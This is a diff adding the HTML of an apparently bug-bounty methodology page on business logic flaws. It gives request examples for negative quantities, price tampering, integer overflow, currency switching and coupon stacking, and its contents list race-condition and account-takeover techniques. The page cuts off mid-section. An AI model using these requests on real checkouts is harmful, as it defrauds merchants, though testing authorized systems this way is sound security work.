+          <li class="md-nav__item">
+  <a href="#621-negative-quantity-and-price-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.1 Negative Quantity and Price Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#622-currency-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.2 Currency Confusion
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#623-coupon-and-discount-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.3 Coupon and Discount Abuse
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#624-free-trial-and-subscription-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.4 Free Trial and Subscription Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#63-workflow-and-state-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3 Workflow and State Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.3 Workflow and State Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#631-multi-step-process-skip" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3.1 Multi-Step Process Skip
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#632-status-parameter-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3.2 Status Parameter Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#64-race-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4 Race Conditions
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.4 Race Conditions">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#641-high-value-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.1 High-Value Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#642-single-packet-attack-http2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.2 Single-Packet Attack (HTTP/2)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#643-turbo-intruder-http11" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.3 Turbo Intruder (HTTP/1.1)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#644-poc-and-reporting" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.4 PoC and Reporting
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#65-account-and-ownership-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5 Account and Ownership Logic
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.5 Account and Ownership Logic">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#651-logic-based-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.1 Logic-Based Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#652-email-confirmation-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.2 Email Confirmation Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#653-organization-and-invitation-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.3 Organization and Invitation Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#66-feature-abuse-with-security-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6 Feature Abuse with Security Impact
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.6 Feature Abuse with Security Impact">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#661-file-operation-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.1 File Operation Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#662-importexport-data-exposure" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.2 Import/Export Data Exposure
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#663-notification-and-webhook-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.3 Notification and Webhook Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-6-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 6 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="business-logic-flaws">Business Logic Flaws<a class="headerlink" href="#business-logic-flaws" title="Permanent link">&para;</a></h1>
+<p>Business logic flaws are the bugs that prove you understand the application, not just the technology. They are invisible to scanners because they require knowing what the application is <em>supposed</em> to do and then testing whether it <em>actually</em> does it. No CVE, no payload, no tool — just intent and observation. These bugs are consistently underreported and consistently well-paid because finding them requires a human who thought carefully.</p>
+<hr />
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 4.27 4.28 3 21 19.72 19.73 21l-3.67-3.67c-.62.67-1.52 1.22-2.56 1.49V21h-3v-2.18C8.47 18.31 7 16.79 7 15h2c0 1.08 1.37 2 3 2 1.13 0 2.14-.44 2.65-1.08l-2.97-2.97C9.58 12.42 7 11.75 7 9c0-.23 0-.45.07-.66zm7.5.91V3h3v2.18C15.53 5.69 17 7.21 17 9h-2c0-1.08-1.37-2-3-2-.37 0-.72.05-1.05.13L9.4 5.58z"/></svg></span> <strong>6.2 Price &amp; Payment</strong></p>
+<hr />
+<p>Negative quantity, price tampering, currency confusion, coupon reuse, subscription bypass.</p>
+<p><a href="#62-price--payment-manipulation"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Payment logic</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 18h2V6h-2M6 18l8.5-6L6 6z"/></svg></span> <strong>6.3 Workflow &amp; State</strong></p>
+<hr />
+<p>Multi-step skip, status parameter manipulation, forced browsing for business impact.</p>
+<p><a href="#63-workflow-and-state-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Workflow</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 4a8 8 0 0 1 8 8 8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8m0 2a6 6 0 0 0-6 6 6 6 0 0 0 6 6 6 6 0 0 0 6-6 6 6 0 0 0-6-6m-1 2h1.5v3.78l2.33 2.33-1.06 1.06L14 12.4zM2 18a1 1 0 0 1-1-1 1 1 0 0 1 1-1h3.83c.31.71.71 1.38 1.17 2zm1-5a1 1 0 0 1-1-1 1 1 0 0 1 1-1h2.05L5 12l.05 1zm1-5a1 1 0 0 1-1-1 1 1 0 0 1 1-1h3c-.46.62-.86 1.29-1.17 2z"/></svg></span> <strong>6.4 Race Conditions</strong></p>
+<hr />
+<p>Single-packet attack, Turbo Intruder, double-spend, coupon reuse via concurrency.</p>
+<p><a href="#64-race-conditions"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Race conditions</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 9c6 0 6 4 6 4v2h-6v-2s0-1.69-1.15-3.2c-.17-.23-.38-.45-.6-.66C14.77 9.06 15.34 9 16 9M2 13s0-4 6-4 6 4 6 4v2H2zm7 4v2h6v-2l3 3-3 3v-2H9v2l-3-3zM8 1C6.34 1 5 2.34 5 4s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3m8 0c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg></span> <strong>6.5 Account &amp; Ownership Logic</strong></p>
+<hr />
+<p>Logic-based ATO, email confirmation bypass, org invitation abuse.</p>
+<p><a href="#65-account-and-ownership-logic"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Account logic</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.53 22H10c-.25 0-.46-.18-.5-.42l-.37-2.65c-.63-.25-1.17-.59-1.69-.99l-2.49 1.01c-.22.08-.49 0-.61-.22l-2-3.46a.493.493 0 0 1 .12-.64l2.11-1.66c-.04-.32-.07-.64-.07-.97s.03-.66.07-1L2.46 9.37a.493.493 0 0 1-.12-.64l2-3.46c.12-.22.39-.31.61-.22l2.49 1c.52-.39 1.06-.73 1.69-.98l.37-2.65c.04-.24.25-.42.5-.42h4c.25 0 .46.18.5.42l.37 2.65c.63.25 1.17.59 1.69.98l2.49-1c.22-.09.49 0 .61.22l2 3.46c.12.22.07.49-.12.64L19.43 11c.04.34.07.67.07 1v.19c-.5-.12-1-.19-1.5-.19-.92 0-1.78.21-2.56.58.03-.19.06-.38.06-.58 0-1.93-1.57-3.5-3.5-3.5S8.5 10.07 8.5 12s1.57 3.5 3.5 3.5c.2 0 .39-.03.58-.06a5.97 5.97 0 0 0 .95 6.56M16 15v6l5-3z"/></svg></span> <strong>6.6 Feature Abuse</strong></p>
+<hr />
+<p>File operations, import/export data exposure, webhook info leakage.</p>
+<p><a href="#66-feature-abuse-with-security-impact"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Feature abuse</a></p>
+</li>
+</ul>
+</div>
+<hr />
+<h2 id="the-mental-model">The Mental Model<a class="headerlink" href="#the-mental-model" title="Permanent link">&para;</a></h2>
+<p>Before touching any feature, ask three questions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>1. What assumption does this feature make about user behavior?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2. What happens if I violate that assumption?
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>3. What is the worst outcome if the assumption is wrong?
+</span></code></pre></div>
+<p><strong>Assumptions worth violating:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Assumption</th>
+<th>How to Violate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Users enter positive quantities</td>
+<td>Try 0, -1, 0.001, 2147483648</td>
+</tr>
+<tr>
+<td>Users complete steps in order</td>
+<td>Skip step 2, jump to final step</td>
+</tr>
+<tr>
+<td>Discount codes are used once</td>
+<td>Apply twice, or concurrently</td>
+</tr>
+<tr>
+<td>Users won't modify price fields</td>
+<td>Tamper the price in the request body</td>
+</tr>
+<tr>
+<td>Free trial ends after 30 days</td>
+<td>Re-register, extend, bypass</td>
+</tr>
+<tr>
+<td>Action X requires verified email</td>
+<td>Skip verification, access directly</td>
+</tr>
+<tr>
+<td>One request = one operation</td>
+<td>Send 20 concurrent identical requests</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>App has checkout / payments / subscriptions?
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>→ Price manipulation first. Negative quantity, then price field tampering.
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>App has coupon or promo codes?
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>→ Apply twice sequentially, then apply twice concurrently (race condition).
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>App has a multi-step flow (checkout, onboarding, KYC)?
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>→ Map every step, then skip each one. Focus on business consequence.
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>App has org/team features?
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>→ Invite yourself as admin. Join without invite. Leave and retain access.
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>App has any time-sensitive or single-use operations?
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>→ Race condition. Single-packet attack via HTTP/2 in Burp.
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>App has file upload, import, or export?
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>→ Filename collision, data exposure in exports, CSV injection in imports.
+</span></code></pre></div>
+<hr />
+<h2 id="62-price--payment-manipulation">6.2 Price &amp; Payment Manipulation<a class="headerlink" href="#62-price--payment-manipulation" title="Permanent link">&para;</a></h2>
+<h3 id="621-negative-quantity-and-price-tampering">6.2.1 Negative Quantity and Price Tampering<a class="headerlink" href="#621-negative-quantity-and-price-tampering" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any checkout flow that sends item details in the request body. The server should compute price server-side — if it trusts client-supplied values, it's vulnerable.</p>
+<div class="language-bash highlight"><span class="filename">quantity_and_price_tamper.sh</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Standard checkout request:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>POST<span class="w"> </span>/api/checkout
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">99</span>.99<span class="o">}]}</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Negative quantity — total may become negative:</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span>-1,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">99</span>.99<span class="o">}]}</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="c1"># Zero quantity — order for free:</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">99</span>.99<span class="o">}]}</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="c1"># Fractional quantity:</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">0</span>.001,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">99</span>.99<span class="o">}]}</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># May result in $0.10 charge for a $99.99 item</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1"># Direct price tampering:</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">0</span>.01<span class="o">}]}</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span>-99.99<span class="o">}]}</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="c1"># Integer overflow (32-bit signed int max + 1 wraps to negative):</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="o">{</span><span class="s2">&quot;items&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;product_id&quot;</span>:<span class="w"> </span><span class="s2">&quot;abc&quot;</span>,<span class="w"> </span><span class="s2">&quot;quantity&quot;</span>:<span class="w"> </span><span class="m">2147483648</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">99</span>.99<span class="o">}]}</span>
+</span></code></pre></div>
+<p><strong>What to observe after each attempt:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Response</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Total changes in response</td>
+<td>Server is trusting client value</td>
+</tr>
+<tr>
+<td>Order placed at modified amount</td>
+<td>Vulnerable — document immediately</td>
+</tr>
+<tr>
+<td>Negative total processed as credit</td>
+<td>Critical finding</td>
+</tr>
+<tr>
+<td>Error with stack trace</td>
+<td>Info disclosure — note for later</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="622-currency-confusion">6.2.2 Currency Confusion<a class="headerlink" href="#622-currency-confusion" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any app that supports multiple currencies.</p>
+<div class="language-bash highlight"><span class="filename">currency_confusion.sh</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># View product priced in USD, switch currency to lower-value at payment:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>POST<span class="w"> </span>/api/checkout
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">{</span><span class="s2">&quot;amount&quot;</span>:<span class="w"> </span><span class="m">100</span>,<span class="w"> </span><span class="s2">&quot;currency&quot;</span>:<span class="w"> </span><span class="s2">&quot;KES&quot;</span><span class="o">}</span><span class="w">   </span><span class="c1"># 100 KES ≈ $0.77 vs $100 USD</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Additional tests:</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1"># Remove currency field entirely → does app default to cheapest?</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="o">{</span><span class="s2">&quot;amount&quot;</span>:<span class="w"> </span><span class="m">100</span><span class="o">}</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c1"># Invalid currency code → error may reveal backend logic:</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="o">{</span><span class="s2">&quot;amount&quot;</span>:<span class="w"> </span><span class="m">100</span>,<span class="w"> </span><span class="s2">&quot;currency&quot;</span>:<span class="w"> </span><span class="s2">&quot;INVALID&quot;</span><span class="o">}</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="c1"># Switch currency between cart and payment steps:</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="c1"># Cart: {&quot;currency&quot;: &quot;USD&quot;}</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="c1"># Payment: {&quot;currency&quot;: &quot;BTC&quot;}  → different valuation entirely</span>
+</span></code></pre></div>
+<hr />
+<h3 id="623-coupon-and-discount-abuse">6.2.3 Coupon and Discount Abuse<a class="headerlink" href="#623-coupon-and-discount-abuse" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every coupon/discount system. Run sequential tests first, then concurrent (race condition — see 6.4).</p>
+<div class="language-bash highlight"><span class="filename">coupon_abuse.sh</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># 1. Same coupon applied twice (sequential):</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;SAVE20&quot;</span><span class="o">}</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;SAVE20&quot;</span><span class="o">}</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Does discount stack? ($20 off twice = $40?)</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1"># 2. Stack multiple different coupons:</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;SAVE20&quot;</span><span class="o">}</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;FREESHIP&quot;</span><span class="o">}</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;EXTRA10&quot;</span><span class="o">}</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1"># Combined to 100%+ discount?</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="c1"># 3. Expired coupon:</span>
